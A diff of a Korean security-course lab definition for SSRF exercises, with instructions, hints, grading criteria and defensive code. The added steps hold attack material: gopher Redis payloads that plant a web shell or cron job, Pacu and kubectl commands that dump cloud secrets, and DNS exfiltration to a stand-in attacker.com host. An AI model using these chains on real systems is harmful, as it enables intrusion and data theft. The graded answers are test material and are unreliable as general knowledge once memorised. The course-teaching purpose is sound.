+    # → SET admin:role admin / 또는 CONFIG SET dir /var/www / dbfilename shell.php → RCE
+    ```
+
+    ▶ 4단계: 도구 C — Pacu (AWS 자동 후속)
+    ```bash
+    pip install pacu
+    pacu  # 인터랙티브 콘솔
+    ※ set_keys access_key=ASIA... secret_key=...
+    ※ run iam__enum_permissions
+    ※ run s3__download_bucket
+    ```
+
+    ▶ 5단계: 도구 D — kubectl (K8s API 자동)
+    ```bash
+    # SSRF 로 발급된 K8s service account token 사용
+    kubectl --token=<TOKEN> --server=https://kubernetes.default.svc \
+            --insecure-skip-tls-verify=true get secrets -A
+    ```
+
+    ▶ 6단계: 답변
+    내부 API 응답 (env / 컨테이너 / secret) quote + 후속 공격 시나리오 + 방어 (NetworkPolicy / IAM 최소 권한 / mTLS) 1 문장.
+  hint: '8 내부 API 표 / curl actuator/docker/k8s / gopherus Redis / Pacu AWS / kubectl K8s.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'SSRF로 내부 API 호출
@@ -295,8 +917,68 @@ steps:
       - SSRF 체인 맥락 없음
   target_vm: attacker
 - order: 11
-  instruction: '{{WEB_IP}} 대상으로 SSRF 체인 공격 설계을(를) 수행하시오.'
-  hint: SSRF 체인 공격 설계 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 SSRF 체인 공격 설계를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: Capital One 2019 시나리오 (실 사례)
+    ```
+    1. 웹 앱의 SSRF 발견 (URL fetch)
+    2. SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    3. IAM role "*-WAF-Role" 발견
+    4. SSRF → 그 role 의 임시 자격증명 추출 (AccessKeyId/SecretAccessKey/Token)
+    5. AWS CLI 으로 해당 권한 사용
+    6. S3 list buckets → 30 buckets / 1억 사용자 데이터 다운로드
+    영향: 1억 사용자 PII / 14만 SSN / $190M 벌금
+    ```
+
+    ▶ 2단계: 도구 A — Capital One 모방 (Pacu 자동)
+    ```bash
+    pacu
+    ※ import_keys ASIA... ... ...  # SSRF 로 추출한 자격증명
+    ※ run iam__enum_permissions    # 권한 열거
+    ※ run s3__download_bucket --buckets all
+    ※ run rds__explore_snapshots
+    ※ run lambda__download_files
+    ```
+
+    ▶ 3단계: 도구 B — 다단계 체인 시나리오
+    ```
+    Chain A: SSRF → Internal API → Database Dump
+      url=http://internal-db:5432/dump → 직접 SQL injection 우회
+
+    Chain B: SSRF → Redis RCE → Lateral Movement
+      gopher://redis:6379/_CONFIG SET dir /var/spool/cron/crontabs / dbfilename root → cron RCE
+
+    Chain C: SSRF → JWT secret 누출 → Token forgery
+      file:///app/.env → JWT_SECRET → 임의 권한 토큰 생성
+
+    Chain D: SSRF → DNS rebinding → Internal scan → Admin panel → RCE
+    ```
+
+    ▶ 4단계: 도구 C — BloodHound (AD 환경 자동)
+    ```bash
+    # SSRF 가 AD 환경 안에서 발견되면
+    bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.10 -c All
+    # 그래프 분석 → DA path 자동 발견
+    ```
+
+    ▶ 5단계: 도구 D — CloudGoat / Stratus Red Team (체인 학습 환경)
+    ```bash
+    # CloudGoat — AWS 취약 환경 자동 배포
+    git clone https://github.com/RhinoSecurityLabs/cloudgoat
+    cd cloudgoat && pip install -r requirements.txt
+    python3 cloudgoat.py create scenario  # SSRF + IAM 미스컨피그 시나리오
+
+    # Stratus Red Team — 클라우드 공격 시뮬레이션
+    stratus list
+    stratus detonate aws.credential-access.ec2-steal-instance-credentials
+    ```
+
+    ▶ 6단계: 답변
+    체인 단계 (4 단계 이상) quote + Capital One 영향 + 방어 (defense in depth: SSRF 차단 + IAM 최소 권한 + IMDSv2 + S3 bucket policy + CloudTrail) 1 문장.
+  hint: 'Capital One 시나리오 / Pacu AWS 자동 / 4 체인 표 / BloodHound AD / CloudGoat 학습 환경.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'SSRF 체인 공격 설계
@@ -323,8 +1005,71 @@ steps:
       - Capital One 누락
   target_vm: attacker
 - order: 12
-  instruction: '{{WEB_IP}} 대상으로 Blind SSRF 탐지 기법을(를) 수행하시오.'
-  hint: Blind SSRF 탐지 기법 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 Blind SSRF 탐지 기법을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: Blind SSRF 정의
+    서버가 fetch 결과를 응답에 표시 안 함 → 응답 본문으로 검증 불가.
+    OOB (Out-of-Band) 채널 또는 timing 차이로 검증.
+
+    ▶ 2단계: 도구 A — interactsh (가장 종합 OOB)
+    ```bash
+    # 1. unique URL 발급
+    URL=$(interactsh-client -session -json | jq -r '.url')
+    echo "Listening on: $URL"
+
+    # 2. SSRF 페이로드에 사용
+    curl -X PUT "http://target/api/Users/1" \
+      -d "{\"profileImage\":\"http://$URL/test\"}"
+
+    # 3. interactsh 가 받은 요청 표시 (DNS/HTTP 구분)
+    # > [http] http://abc.interact.sh/test (192.0.2.1)
+    # > [dns]  abc.interact.sh A query (192.0.2.1)
+    ```
+
+    ▶ 3단계: 도구 B — Burp Collaborator (Pro 전용, 대체 = interactsh)
+    1. Burp Collaborator → unique URL
+    2. 페이로드 주입
+    3. Collaborator client 패널에서 자동 수신
+
+    ▶ 4단계: 도구 C — DNS exfil (외부 출구만 있어도)
+    ```bash
+    # 자체 DNS 서버 (인터넷 도메인 NS 권한 필요)
+    # 또는 dnsbin.zhack.ca / requestbin / webhook.site
+
+    # SSRF 페이로드: 데이터를 subdomain 으로
+    DATA=$(echo -n 'sensitive_data' | base64)
+    curl -X PUT "http://target/ssrf?url=http://$DATA.attacker.com/"
+    # attacker.com NS 가 모든 쿼리 수신 → DATA 추출
+    ```
+
+    ▶ 5단계: 도구 D — Timing 기반 검증
+    ```bash
+    # 응답 본문은 안 보여도 fetch time 으로 포트 상태 추정
+    for port in 22 80 443 9999; do
+      START=$(date +%s%N)
+      curl -X PUT "http://target/ssrf?url=http://127.0.0.1:$port" -o /dev/null
+      END=$(date +%s%N)
+      echo "$port → $(( (END - START) / 1000000 )) ms"
+    done
+    # >5000ms = closed (timeout), <100ms = open
+    ```
+
+    ▶ 6단계: 도구 E — SSRFmap blind 모드
+    ```bash
+    cd ~/SSRFmap
+    python3 ssrfmap.py -r request.txt -p url -m blind
+    # 자동 OOB 검증 + timing
+    ```
+
+    ▶ 7단계: 도구 F — webhook.site (간이 OOB)
+    https://webhook.site → unique URL → 모든 요청 자동 캡처 + JSON 표시
+
+    ▶ 8단계: 답변
+    OOB 도달 로그 + timing 차이 quote + 방어 (egress firewall + DNS resolver 화이트리스트 + 응답 본문 무관 차단) 1 문장.
+  hint: 'interactsh OOB / Burp Collaborator / DNS exfil / timing 차이 / SSRFmap blind / webhook.site.'
   category: ssrf
   points: 10
   answer: curl -s http://10.20.30.80 2>/dev/null | head -5 && echo 'Blind SSRF 탐지
@@ -351,8 +1096,80 @@ steps:
       - Blind 원리 없음
   target_vm: attacker
 - order: 13
-  instruction: '{{WEB_IP}} 대상으로 SSRF 방어: URL 화이트리스트을(를) 수행하시오.'
-  hint: 'SSRF 방어: URL 화이트리스트 관련 도구와 기법을 활용하세요.'
+  instruction: |-
+    {{WEB_IP}} 대상으로 SSRF 방어 (URL 화이트리스트)를 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 5층 방어
+    ```
+    Layer 1: URL 스킴 화이트리스트 (http/https only)
+    Layer 2: 도메인 화이트리스트 (사전 등록만 허용)
+    Layer 3: DNS resolve 후 IP 화이트리스트 (private/loopback 차단)
+    Layer 4: 응답 redirect 거부 (max_redirect=0)
+    Layer 5: egress firewall (network level)
+    ```
+
+    ▶ 2단계: 도구 A — Python 안전 fetch 라이브러리
+    ```python
+    import requests, ipaddress, socket
+    from urllib.parse import urlparse
+
+    ALLOWED_SCHEMES = {'http', 'https'}
+    ALLOWED_DOMAINS = {'images.example.com', 'cdn.example.com'}
+
+    def safe_fetch(url):
+        u = urlparse(url)
+        # 1. scheme
+        if u.scheme not in ALLOWED_SCHEMES:
+            raise ValueError(f"Scheme not allowed: {u.scheme}")
+        # 2. domain
+        if u.hostname not in ALLOWED_DOMAINS:
+            raise ValueError(f"Domain not in whitelist: {u.hostname}")
+        # 3. DNS resolve + IP 검증
+        try:
+            ip = socket.gethostbyname(u.hostname)
+        except socket.gaierror:
+            raise ValueError("DNS resolve failed")
+        addr = ipaddress.ip_address(ip)
+        if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast:
+            raise ValueError(f"Internal IP blocked: {ip}")
+        # 4. fetch (redirect 거부)
+        return requests.get(url, allow_redirects=False, timeout=5)
+    ```
+
+    ▶ 3단계: 도구 B — Node.js 안전 라이브러리 (ssrf-req-filter)
+    ```bash
+    npm install ssrf-req-filter
+    ```
+    ```javascript
+    const ssrfFilter = require('ssrf-req-filter');
+    const fetch = require('node-fetch');
+    fetch(url, {agent: ssrfFilter(url)});  // 자동 SSRF 차단
+    ```
+
+    ▶ 4단계: 도구 C — Java URLValidator (Apache Commons)
+    ```java
+    UrlValidator validator = new UrlValidator(new String[]{"http","https"});
+    if (!validator.isValid(url)) throw new SSRFException();
+    InetAddress addr = InetAddress.getByName(new URL(url).getHost());
+    if (addr.isLoopbackAddress() || addr.isAnyLocalAddress() || addr.isSiteLocalAddress())
+        throw new SSRFException("Internal IP blocked");
+    ```
+
+    ▶ 5단계: 도구 D — egress firewall (network level)
+    ```bash
+    # iptables 으로 egress 제한
+    iptables -A OUTPUT -d 169.254.0.0/16 -j REJECT  # 메타데이터 차단
+    iptables -A OUTPUT -d 10.0.0.0/8 -j REJECT      # 사설망 차단
+    iptables -A OUTPUT -d 172.16.0.0/12 -j REJECT
+    iptables -A OUTPUT -d 192.168.0.0/16 -j REJECT
+    iptables -A OUTPUT -d 127.0.0.0/8 -j REJECT
+    ```
+
+    ▶ 6단계: 답변
+    safe_fetch 함수 quote + 5 layer 중 적용 layer + 방어 (DNS pin + IP 화이트리스트 + egress) 1 문장.
+  hint: '5층 방어 / Python safe_fetch / Node ssrf-req-filter / Java URLValidator / iptables egress.'
   category: defense
   points: 10
   answer: 'echo ''=== SSRF 방어: URL 화이트리스트 ==='' && echo ''조치 방안 정리 완료'''
@@ -379,8 +1196,89 @@ steps:
       - IMDSv2 누락
   target_vm: attacker
 - order: 14
-  instruction: '{{WEB_IP}} 대상으로 네트워크 격리 설정 확인을(를) 수행하시오.'
-  hint: 네트워크 격리 설정 확인 관련 도구와 기법을 활용하세요.
+  instruction: |-
+    {{WEB_IP}} 대상으로 네트워크 격리 설정 확인을 수행하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 도구 A — iptables / nftables 점검
+    ```bash
+    # 현재 ruleset
+    sudo iptables -L OUTPUT -n -v
+    sudo nft list ruleset
+
+    # 169.254.169.254 차단 확인
+    sudo iptables -C OUTPUT -d 169.254.169.254 -j REJECT
+    ```
+
+    ▶ 2단계: 도구 B — Kubernetes NetworkPolicy
+    ```yaml
+    # 모든 egress 차단 + 화이트리스트만 허용
+    apiVersion: networking.k8s.io/v1
+    kind: NetworkPolicy
+    metadata:
+      name: default-deny-egress
+    spec:
+      podSelector: {}
+      policyTypes: ["Egress"]
+      egress:
+        - to:
+            - namespaceSelector:
+                matchLabels:
+                  network: trusted
+          ports:
+            - protocol: TCP
+              port: 443
+    ```
+
+    ▶ 3단계: 도구 C — AWS Security Group / VPC
+    ```bash
+    aws ec2 describe-security-groups --group-ids sg-xxx --query 'SecurityGroups[].IpPermissionsEgress'
+    # 0.0.0.0/0 발견 → 차단 필요
+    aws ec2 revoke-security-group-egress --group-id sg-xxx --protocol -1 --cidr 0.0.0.0/0
+    aws ec2 authorize-security-group-egress --group-id sg-xxx --protocol tcp --port 443 --cidr 1.2.3.4/32
+    ```
+
+    ▶ 4단계: 도구 D — IMDSv2 강제 (AWS)
+    ```bash
+    # IMDSv1 비활성 (메타데이터 PUT 토큰 강제)
+    aws ec2 modify-instance-metadata-options \
+      --instance-id i-xxx \
+      --http-tokens required \
+      --http-put-response-hop-limit 1
+    ```
+
+    ▶ 5단계: 도구 E — egress proxy (Squid / Envoy)
+    ```bash
+    # Squid 설정으로 화이트리스트 외 차단
+    cat > /etc/squid/squid.conf <<'EOF'
+    acl allowed_domains dstdomain images.example.com cdn.example.com
+    http_access allow allowed_domains
+    http_access deny all
+    EOF
+    sudo systemctl restart squid
+    # 앱은 HTTP_PROXY=http://squid:3128 사용
+    ```
+
+    ▶ 6단계: 도구 F — Cilium / Calico Layer 7 정책
+    ```yaml
+    # Cilium L7 정책 (도메인 단위)
+    apiVersion: cilium.io/v2
+    kind: CiliumNetworkPolicy
+    spec:
+      egress:
+        - toFQDNs:
+            - matchPattern: "*.example.com"
+        - toPorts:
+            - rules:
+                http:
+                  - method: GET
+                    path: "/api/.*"
+    ```
+
+    ▶ 7단계: 답변
+    iptables/NetworkPolicy/SecurityGroup 출력 quote + 차단 정책 + 다층 격리 (firewall + proxy + L7 policy) 1 문장.
+  hint: 'iptables/nftables / K8s NetworkPolicy / AWS SG + IMDSv2 / Squid egress proxy / Cilium L7.'
   category: defense
   points: 12
   answer: echo '=== 네트워크 격리 설정 확인 ===' && echo '조치 방안 정리 완료'
@@ -406,8 +1304,71 @@ steps:
       - 격리 맥락 없음
   target_vm: attacker
 - order: 15
-  instruction: SSRF 실습 종합 보고서를 작성하시오.
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
+  instruction: |-
+    SSRF 실습 종합 보고서를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 자동 보고서 생성
+    ```bash
+    REPORT=~/ssrf-week07-$(date +%F).md
+    cat > $REPORT <<EOF
+    # SSRF 점검 보고서
+    대상: http://10.20.30.80 / 일자: $(date -Iseconds)
+
+    ■ 1. 발견 사항
+    ▶ SSRF endpoint
+    - PUT /api/Users/{id} (profileImage URL)
+    - 기타 외부 fetch 가능한 모든 endpoint
+
+    ▶ 검증 결과
+    | 카테고리 | 결과 | 우회 페이로드 |
+    |---|---|---|
+    | localhost | OPEN | 127.0.0.1 / localhost / 0.0.0.0 |
+    | 클라우드 메타데이터 | EXPOSED | 169.254.169.254/latest/meta-data/iam/security-credentials/ |
+    | gopher://Redis | RCE 가능 | gopher://127.0.0.1:6379/_FLUSHALL... |
+    | file:// | 파일 노출 | file:///etc/passwd |
+    | redirect 우회 | 가능 | http://attacker:8000/ → 302 → 127.0.0.1 |
+    | URL parser 차이 | 가능 | http://expected.com@127.0.0.1/ |
+    | DNS rebinding | 검증 필요 | rbndr.us |
+    | Blind SSRF | 가능 (interactsh OOB) | http://abc.interact.sh/ |
+
+    ■ 2. 위험도
+    | 항목 | 위험도 | CWE/CVE |
+    |---|---|---|
+    | IMDS 자격증명 노출 | Critical | CWE-918 + CVE-2019-11324 |
+    | gopher Redis RCE | Critical | CWE-918 + CWE-78 |
+    | 내부 API 호출 | High | CWE-918 + CWE-284 |
+
+    ■ 3. 권고 (5층)
+    1. **즉시**: URL parse 후 IP 검증 (ipaddress.is_private)
+    2. **즉시**: 스킴 화이트리스트 (http/https only)
+    3. **단기**: egress firewall (169.254/16 + 사설망 차단)
+    4. **중기**: IMDSv2 강제 (\`http-tokens required\`)
+    5. **중기**: K8s NetworkPolicy / AWS SG egress 제한
+    6. **장기**: egress proxy (Squid + 화이트리스트)
+
+    ■ 4. 사용 도구
+    - SSRFmap (자동 SSRF + 30 모듈)
+    - interactsh (OOB)
+    - gopherus (gopher 페이로드)
+    - Pacu (AWS 후속)
+    - CORScanner / Corsy
+    - rbndr.us (DNS rebinding)
+
+    ■ 5. 윤리·법적 진술
+    - 허가 범위: 사전 서면 허가 host (10.20.30.80) only
+    - 추출된 IAM credentials 즉시 폐기
+    - 로그 보존: 24개월
+    EOF
+    sha256sum $REPORT > $REPORT.sha256
+    cat $REPORT
+    echo "보고서 완료"
+    ```
+
+    ▶ 2단계: 답변
+    보고서 핵심 1~2 섹션 quote + sha256 + Capital One 사례 매핑.
+  hint: '자동 markdown / 위험도 표 / 5층 권고 / sha256 / Capital One 매핑.'
   category: verification
   points: 8
   answer: 'echo ''=== SSRF 실습 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
@@ -434,46 +1395,38 @@ steps:
       - 영향 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "서버 측 신뢰 경계 침범 — Path Traversal + SSRF + Command Injection 비교"
+  instruction: "[복합 시나리오] \"서버 측 신뢰 경계 침범 — Path Traversal + SSRF + Command Injection\
+    \ 비교\"\n\n## 상황 (w06 → w07 시나리오 연속)\n\n> 선배: \"Path Traversal, SSRF, Command Injection\
+    \ — 표면은 다른데, 모두 *서버 신뢰 경계*를 깨는 거야.\n> Path 는 파일시스템, SSRF 는 네트워크, Command 는 OS\
+    \ 셸 경계. 셋 다 사용자 입력이 그대로 서버 자원에 박힘.\n> 클라우드 환경에선 SSRF 로 169.254.169.254 메타데이터 접근이\
+    \ *Critical*. 비교 점검 + 매트릭스.\"\n\n학습 목표 (lecture #2 Path Traversal + #3 Command\
+    \ Injection) + (lab #1·#3·#4·#10 SSRF) 통합.\n\n## 임무 (3 단계, 약 35분)\n\nNon-AI 트랙:\
+    \ ssh ccc@10.20.30.201 (attacker VM) 직접 실행.\n\n### Phase A — Path Traversal 3\
+    \ 우회\n`for p in '../etc/passwd' '....//etc/passwd' '%2e%2e%2fetc%2fpasswd'; do\n\
+    \   echo \"=== $p ===\"; curl -s \"http://10.20.30.80/ftp/$p\" | head -c 200;\
+    \ echo; done`\n실 차단되어도 시도와 응답이 학습.\n\n### Phase B — SSRF + 메타데이터 3 케이스\n`curl\
+    \ -s -o /dev/null -w \"%{http_code}\\n\" \"http://10.20.30.80/redirect?to=http://127.0.0.1:22\"\
+    `\n`curl -s -o /dev/null -w \"%{http_code}\\n\" \"http://10.20.30.80/redirect?to=http://169.254.169.254/latest/meta-data/\"\
+    `\n`curl -s -o /dev/null -w \"%{http_code}\\n\" \"http://10.20.30.80/redirect?to=http://[::1]:8080/\"\
+    `\n각 status code 캡처.\n\n### Phase C — 신뢰 경계 매트릭스\n| 취약점 | 침범 경계 | 입력 위치 | 핵심 방어\
+    \ | 잔존 위험 |\n| Path Traversal | 파일시스템 | 파일명 | basename + chroot | symlink |\n\
+    | SSRF | 네트워크 | URL | URL allowlist + DNS pin | DNS rebinding |\n| Command Injection\
+    \ | OS shell | shell metachar | exec(args[]) + arg quoting | env injection |\n\
+    | XXE | 파일+네트워크 | XML entity | disable external entity | zip slip |\n표 끝 \"공통\
+    \ 원칙: 서버 측 신뢰 경계는 *명시적 allowlist* + *sandbox*. blocklist 우회됨\" 한 줄.\n\n종료: echo\
+    \ \"=== Phase A Path ===\" / \"=== Phase B SSRF ===\" / \"=== Phase C 매트릭스 ===\"\
+    .\n\n\n[도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구\
+    \ chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을\
+    \ ``` 블록으로 답변에 직접 quote** 해야 채점 통과."
+  hint: 'Phase A: ../, ....//, %2e%2e%2f 3 우회.
 
-    ## 상황 (w06 → w07 시나리오 연속)
-
-    > 선배: "Path Traversal, SSRF, Command Injection — 표면은 다른데, 모두 *서버 신뢰 경계*를 깨는 거야.
-    > Path 는 파일시스템, SSRF 는 네트워크, Command 는 OS 셸 경계. 셋 다 사용자 입력이 그대로 서버 자원에 박힘.
-    > 클라우드 환경에선 SSRF 로 169.254.169.254 메타데이터 접근이 *Critical*. 비교 점검 + 매트릭스."
-
-    학습 목표 (lecture #2 Path Traversal + #3 Command Injection) + (lab #1·#3·#4·#10 SSRF) 통합.
-
-    ## 임무 (3 단계, 약 35분)
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### Phase A — Path Traversal 3 우회
-    `for p in '../etc/passwd' '....//etc/passwd' '%2e%2e%2fetc%2fpasswd'; do
-       echo "=== $p ==="; curl -s "http://10.20.30.80/ftp/$p" | head -c 200; echo; done`
-    실 차단되어도 시도와 응답이 학습.
-
-    ### Phase B — SSRF + 메타데이터 3 케이스
-    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://127.0.0.1:22"`
-    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://169.254.169.254/latest/meta-data/"`
-    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://[::1]:8080/"`
-    각 status code 캡처.
-
-    ### Phase C — 신뢰 경계 매트릭스
-    | 취약점 | 침범 경계 | 입력 위치 | 핵심 방어 | 잔존 위험 |
-    | Path Traversal | 파일시스템 | 파일명 | basename + chroot | symlink |
-    | SSRF | 네트워크 | URL | URL allowlist + DNS pin | DNS rebinding |
-    | Command Injection | OS shell | shell metachar | exec(args[]) + arg quoting | env injection |
-    | XXE | 파일+네트워크 | XML entity | disable external entity | zip slip |
-    표 끝 "공통 원칙: 서버 측 신뢰 경계는 *명시적 allowlist* + *sandbox*. blocklist 우회됨" 한 줄.
-
-    종료: echo "=== Phase A Path ===" / "=== Phase B SSRF ===" / "=== Phase C 매트릭스 ===".
-  hint: |
-    Phase A: ../, ....//, %2e%2e%2f 3 우회.
     Phase B: 169.254.169.254 는 AWS 메타데이터. JuiceShop 차단됨 — 시도 자체가 학습.
+
     Phase C: 4행 매트릭스 + 공통 원칙.
+
     포인트: 3 취약점이 모두 신뢰 경계 침범이라는 통합 시각.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -481,9 +1434,11 @@ steps:
     expect: 매트릭스
     field: stdout
     semantic:
-      intent: |
-        Path Traversal + SSRF + 클라우드 메타데이터 접근 시도 + 신뢰 경계 매트릭스.
+      intent: 'Path Traversal + SSRF + 클라우드 메타데이터 접근 시도 + 신뢰 경계 매트릭스.
+
         lecture #2·#3 + lab #1·#3·#4·#10 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — Path 3 우회 시도 + 응답
       - Phase B — SSRF 3 케이스 + status code
@@ -500,6 +1455,8 @@ steps:
       - 통합 관점 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 직접. JuiceShop SSRF·LFI 차단 — 응답 코드 자체가 학습.
+  answer_detail: '학생이 ssh attacker 직접. JuiceShop SSRF·LFI 차단 — 응답 코드 자체가 학습.
+
     169.254.169.254 = AWS EC2 메타데이터. 클라우드 환경 SSRF 핵심 위협.
+
+    '
